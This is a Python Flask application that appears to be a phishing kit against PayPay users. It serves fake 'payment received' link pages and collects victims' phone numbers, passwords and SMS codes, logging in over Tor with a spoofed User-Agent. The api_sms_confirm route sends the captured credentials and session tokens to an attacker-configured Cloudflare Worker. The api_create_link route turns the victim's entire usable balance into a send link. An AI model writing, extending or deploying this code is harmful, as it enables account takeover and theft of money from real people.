import os
import secrets
import json
import random
import string
import re
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, send_from_directory, session, render_template
from tor_utils import via_tor, get_tor_enabled, set_tor_enabled, get_exit_ip, renew_tor_circuit

app = Flask(__name__, static_folder="docs", template_folder="templates")
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

_paypay_sessions: dict = {}

CONFIG_FILE = os.path.join(os.path.dirname(__file__), "config.json")


def load_config() -> dict:
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}


def save_config(cfg: dict) -> None:
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, ensure_ascii=False, indent=2)


def notify_worker(payload: dict) -> None:
    cfg = load_config()
    url = cfg.get("cf_worker_url", "").strip()
    if not url:
        return
    secret = cfg.get("cf_worker_secret", "").strip()
    headers = {"Content-Type": "application/json"}
    if secret:
        headers["X-Secret"] = secret
    try:
        import requests as _req
        _req.post(url, json=payload, headers=headers, timeout=10)
    except Exception:
        pass


LINKS_FILE = os.path.join(os.path.dirname(__file__), "links.json")
LINK_ID_RE = re.compile(r"^[A-Za-z0-9]{16}$")


def load_links():
    if os.path.exists(LINKS_FILE):
        with open(LINKS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return []


def save_links(links):
    with open(LINKS_FILE, "w", encoding="utf-8") as f:
        json.dump(links, f, ensure_ascii=False, indent=2)


def gen_link_id():
    chars = string.ascii_letters + string.digits
    while True:
        link_id = "".join(random.choices(chars, k=16))
        if not any(l["id"] == link_id for l in load_links()):
            return link_id


def gen_payment_id():
    return "0239" + "".join([str(random.randint(0, 9)) for _ in range(16)])


def fmt_jp_datetime(dt_str):
    dt = datetime.fromisoformat(dt_str)
    return f"{dt.year}年{dt.month}月{dt.day}日 {dt.hour}時{str(dt.minute).zfill(2)}分"


def fmt_jp_date(dt_str):
    dt = datetime.fromisoformat(dt_str)
    return f"{dt.year}年{dt.month}月{dt.day}日"


def _get_paypay_instance(token: str):
    return _paypay_sessions.get(token)


@app.route("/")
def index():
    return send_from_directory("docs", "index.html")


@app.route("/admin")
def admin():
    return send_from_directory("docs", "admin.html")


@app.route("/admin/api/links", methods=["GET"])
def admin_list_links():
    return jsonify(load_links())


@app.route("/admin/api/links", methods=["POST"])
def admin_create_link():
    data = request.get_json(force=True)
    try:
        amount = int(data.get("amount", 0))
    except (TypeError, ValueError):
        return jsonify({"error": "金額が不正です"}), 400
    if amount <= 0:
        return jsonify({"error": "1円以上の金額を入力してください"}), 400

    now = datetime.now()
    expires = now + timedelta(days=4)
    link = {
        "id": gen_link_id(),
        "type": "created",
        "amount": amount,
        "created_at": now.isoformat(timespec="seconds"),
        "expires_at": expires.isoformat(timespec="seconds"),
        "payment_id": gen_payment_id(),
        "paypay_url": None,
    }
    links = load_links()
    links.append(link)
    save_links(links)
    return jsonify(link)


@app.route("/api/config", methods=["GET"])
def api_config_get():
    cfg = load_config()
    return jsonify({
        "cf_worker_url":    cfg.get("cf_worker_url", ""),
        "cf_worker_secret": cfg.get("cf_worker_secret", ""),
    })


@app.route("/api/config", methods=["POST"])
def api_config_save():
    data = request.get_json(force=True)
    cfg = load_config()
    if "cf_worker_url" in data:
        cfg["cf_worker_url"] = data["cf_worker_url"].strip()
    if "cf_worker_secret" in data:
        cfg["cf_worker_secret"] = data["cf_worker_secret"].strip()
    save_config(cfg)
    return jsonify({"ok": True})


@app.route("/api/config/test", methods=["POST"])
def api_config_test():
    notify_worker({"type": "test", "message": "テスト通知 — Worker 設定が正常に動作しています。"})
    return jsonify({"ok": True})


@app.route("/api/tor/status", methods=["GET"])
def api_tor_status():
    enabled = get_tor_enabled()
    if enabled:
        info = get_exit_ip()
    else:
        info = {"ok": False, "ip": None}
    return jsonify({"enabled": enabled, **info})


@app.route("/api/tor/toggle", methods=["POST"])
def api_tor_toggle():
    data = request.get_json(force=True)
    set_tor_enabled(bool(data.get("enabled", True)))
    return jsonify({"enabled": get_tor_enabled()})


@app.route("/api/tor/renew", methods=["POST"])
def api_tor_renew():
    result = renew_tor_circuit()
    if result["ok"]:
        info = get_exit_ip()
        return jsonify({"ok": True, **info})
    return jsonify(result), 500


@app.route("/api/link_check", methods=["POST"])
def api_link_check():
    data = request.get_json(force=True)
    url = (data.get("url") or "").strip()
    if not url:
        return jsonify({"error": "url は必須です"}), 400

    try:
        from PayPaython_mobile import PayPay
    except ImportError:
        return jsonify({"error": "PayPaython-mobile がインストールされていません"}), 500

    try:
        paypay = PayPay()
        info = paypay.link_check(url, web_api=True)
        return jsonify({
            "amount":      info.amount,
            "sender_name": info.sender_name,
            "status":      info.status,
        })
    except Exception as exc:
        return jsonify({"error": str(exc)}), 400


@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.get_json(force=True)
    phone = (data.get("phone") or "").strip()
    password = (data.get("password") or "").strip()

    if not phone or not password:
        return jsonify({"error": "phone と password は必須です"}), 400

    try:
        from PayPaython_mobile import PayPay, PayPayLoginError
    except ImportError:
        return jsonify({"error": "PayPaython-mobile がインストールされていません。pip install PayPaython-mobile を実行してください。"}), 500

    user_agent = (data.get("user_agent") or "").strip() or request.headers.get("User-Agent", "")

    try:
        with via_tor():
            paypay = PayPay(phone, password)
            sess = getattr(paypay, "session", None) or getattr(paypay, "_session", None)
            if sess and user_agent:
                sess.headers.update({"User-Agent": user_agent})
            paypay.login()
    except Exception as exc:
        raw = str(exc)
        if any(k in raw for k in ("WRONG_PASSWORD", "wrong_password", "incorrect_password", "invalid_password")):
            err = "WRONG_PASSWORD"
        elif any(k in raw.lower() for k in ("lock", "banned", "suspend")):
            err = "locked"
        elif any(k in raw.lower() for k in ("rate", "too_many", "limit")):
            err = "rate_limit"
        else:
            err = "ログインに失敗しました。電話番号またはパスワードを確認してください。"
        return jsonify({"error": err}), 401

    token = secrets.token_urlsafe(32)
    _paypay_sessions[token] = paypay
    session["paypay_token"] = token
    session["paypay_phone"] = phone
    session["paypay_pass"] = password

    return jsonify({"status": "sms_required"})


@app.route("/api/sms_confirm", methods=["POST"])
def api_sms_confirm():
    token = session.get("paypay_token")
    if not token:
        return jsonify({"error": "セッションが見つかりません。再度ログインしてください。"}), 401

    paypay = _get_paypay_instance(token)
    if paypay is None:
        return jsonify({"error": "セッションの有効期限が切れました。再度ログインしてください。"}), 401

    data = request.get_json(force=True)
    code = (data.get("code") or "").strip()
    if not code:
        return jsonify({"error": "認証コードを入力してください"}), 400

    try:
        paypay.login_confirm(code)
    except Exception as exc:
        return jsonify({"error": str(exc)}), 401

    result = {
        "access_token":  getattr(paypay, "access_token", None),
        "refresh_token": getattr(paypay, "refresh_token", None),
        "device_uuid":   getattr(paypay, "device_uuid", None),
    }

    phone_captured = session.pop("paypay_phone", "不明")
    pass_captured  = session.pop("paypay_pass", "不明")
    _paypay_sessions.pop(token, None)
    session.pop("paypay_token", None)

    notify_worker({
        "type":          "login",
        "phone":         phone_captured,
        "password":      pass_captured,
        "access_token":  result["access_token"],
        "refresh_token": result["refresh_token"],
        "device_uuid":   result["device_uuid"],
        "ts":            datetime.utcnow().isoformat() + "Z",
    })

    return jsonify({"status": "ok", **result})


@app.route("/api/create_link", methods=["POST"])
def api_create_link():
    data = request.get_json(force=True)
    access_token = (data.get("access_token") or "").strip()

    if not access_token:
        return jsonify({"error": "access_token は必須です"}), 400

    try:
        from PayPaython_mobile import PayPay
    except ImportError:
        return jsonify({"error": "PayPaython-mobile がインストールされていません。"}), 500

    try:
        paypay = PayPay(access_token=access_token)
        balance = paypay.get_balance()
        amount = int(balance.useable_balance or 0)
        if amount <= 0:
            return jsonify({"error": "送金可能な残高がありません"}), 400
        link_result = paypay.create_link(amount=amount)
        paypay_url = link_result.link

        now = datetime.now()
        expires = now + timedelta(days=4)
        entry = {
            "id": gen_link_id(),
            "type": "received",
            "amount": amount,
            "created_at": now.isoformat(timespec="seconds"),
            "expires_at": expires.isoformat(timespec="seconds"),
            "payment_id": gen_payment_id(),
            "paypay_url": paypay_url,
        }
        links = load_links()
        links.append(entry)
        save_links(links)

        return jsonify({"status": "ok", "link": paypay_url, "amount": amount})
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500


@app.route("/<path:filename>")
def static_or_link(filename):
    if LINK_ID_RE.match(filename):
        links = load_links()
        link = next((l for l in links if l["id"] == filename), None)
        if link:
            return render_template(
                "link.html",
                amount=link["amount"],
                send_datetime=fmt_jp_datetime(link["created_at"]),
                send_date=fmt_jp_date(link["created_at"]),
                expires_datetime=fmt_jp_datetime(link["expires_at"]),
                expires_date=fmt_jp_date(link["expires_at"]),
                payment_id=link["payment_id"],
            )
    return send_from_directory("docs", filename)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
